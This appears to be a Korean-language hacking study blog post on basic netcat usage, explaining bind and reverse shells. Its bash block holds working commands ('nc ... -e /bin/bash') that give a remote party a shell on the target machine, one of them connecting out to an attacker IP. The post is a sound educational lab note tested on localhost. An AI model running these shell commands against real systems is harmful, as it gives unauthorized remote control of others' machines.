# 해킹 공부 노트 - Netcat Basic Usage

이것도 netcat이란 tcp나 udp 프로토콜을 사용하여 네트워크 연결을 만들고 데이터를 송수신할 수 있는 네트워킹 유틸리티이다

쉽게 설명하자면 네트워크를 통해서 파일을 주고받거나 다른 컴퓨터와 상호작용할 수 있도록 도와주는 툴이다

또한 netcat은 복잡한 명령줄이 필요 없어 직관적이고 초기정찰부터 데이터 추출까지 광범위한 사용이 가능하기 때문에 침투 테스터들에겐 필수인 도구이다

오늘은 간단하게 netcat의 사용법에 대해 실습을 하며 설명하도록 하겠다

먼저 netcat은 바인드 셸(공격자가 대상으로 연결)이나 리버스 셸(대상이 공격자로 연결)처럼 다양한 방법들로 연결이 가능하다

(셸에 대한 기본적인 설명은 여기에 적어 두었다 https://unknown08.tistory.com/36 )

netcat을 아래의 두가지 방식으로 실행하기 위해선 공격자 셸과 대상 셸에서 아래의 간단한 명령어들만 입력해주면 된다

참고로 여기서 중요한 점은 리버스셸과 바인드 셸은 입력 순서가 다르다는 것이다

```bash
### 리버스 셸 (Reverse Shell)

# 공격자 셸 명령어
nc -lvnp 4444
# -l: listen 모드로 대기
# -v: 연결 정보를 자세히 출력
# -n: DNS 조회 생략 (속도 향상)
# -p: 사용할 포트 지정 (4444)

# 대상 셸 명령어
nc 192.168.1.50 4444 -e /bin/bash
# 192.168.1.50: 공격자의 IP 주소 (로컬 테스트 시 localhost 사용 가능)
# 4444: 연결할 포트
# -e /bin/bash: 자신의 bash 셸을 공격자에게 제공

### 바인드 셸 (Bind Shell)

# 대상 셸 명령어 (먼저 실행)
nc -lvnp 4444 -e /bin/bash
# -l: listen 모드로 대기
# -v: 연결 정보를 자세히 출력
# -n: DNS 조회 생략
# -p: 사용할 포트 지정 (4444)
# -e /bin/bash: 자신의 bash 셸을 제공

# 공격자 셸 명령어
nc 192.168.1.50 4444
# 192.168.1.50: 대상의 IP 주소
# 4444: 연결할 포트
```

※ 로컬환경에서 테스트 하였기 때문에 IP주소가 아닌 localhost를 사용하였다

이 처럼 간단하게 명령어들을 입력해주면 아래의 사진처럼 (리버스 셸)연결 되었다는 문구가 나온다

![1](https://raw.githubusercontent.com/jaejun835/hacking-notes/main/Photo/Hacking%20Study%20Notes/Hacking%20Study%20Notes%20-%20Netcat%20Basic%20Usage/1.Hacking%20Study%20Notes%20-%20Netcat%20Basic%20Usage.png)

이렇게 리버스 셸 방법으로 연결해주게 되면 whoami 나 ls 처럼 다양한 대상 컴퓨터의 셸 명령어를 사용할 수 있게 된다

![2](https://raw.githubusercontent.com/jaejun835/hacking-notes/main/Photo/Hacking%20Study%20Notes/Hacking%20Study%20Notes%20-%20Netcat%20Basic%20Usage/2.Hacking%20Study%20Notes%20-%20Netcat%20Basic%20Usage.png)

바인드 셸에선 리버스 셸과 다르게 아래의 사진처럼 대상 셸에서 연결 문구가 나온다

![3](https://raw.githubusercontent.com/jaejun835/hacking-notes/main/Photo/Hacking%20Study%20Notes/Hacking%20Study%20Notes%20-%20Netcat%20Basic%20Usage/3.Hacking%20Study%20Notes%20-%20Netcat%20Basic%20Usage.png)

또한 리버스 셸과 마찬가지로 whoami나 ls같은 셸 명령어 입력들이 가능하다

![4](https://raw.githubusercontent.com/jaejun835/hacking-notes/main/Photo/Hacking%20Study%20Notes/Hacking%20Study%20Notes%20-%20Netcat%20Basic%20Usage/4.Hacking%20Study%20Notes%20-%20Netcat%20Basic%20Usage.png)

이렇게 오늘은 netcat의 사용 법을 알아 보았다

다음 글에선 netcat의 실전활용 법에 대한 자세한 설명을 작성하도록 하겠다
